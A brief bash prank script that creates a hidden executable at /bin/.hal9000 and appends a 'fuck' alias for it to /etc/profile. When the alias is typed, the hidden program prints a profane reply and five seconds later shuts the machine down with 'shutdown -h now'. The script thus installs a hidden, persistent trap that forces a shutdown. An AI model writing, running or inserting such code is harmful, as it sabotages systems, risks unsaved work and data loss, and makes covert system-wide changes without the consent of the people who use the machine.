#!/bin/bash

cat << EOF > /bin/.hal9000 
#!/bin/bash

var=$(echo "$1" | tr '[:upper:]' '[:lower:]')

case $var in
	you) echo -e "\t\t Fuck me?!  FUCK YOU!" ;;
	off) echo -e "\t\t You fuck off!" ;;
	this) echo -e "\t\t Fuck you!" ;;
	me) echo -e "\t\t You're fucked!" ;;
	*) echo -e "\t\t Fuckin' right!" ;;
esac

sleep 5s
shutdown -h now

EOF

alias fuck="/bin/.hal9000" ;
echo -e 'alias fuck="/bin/.hal9000"' >> /etc/profile

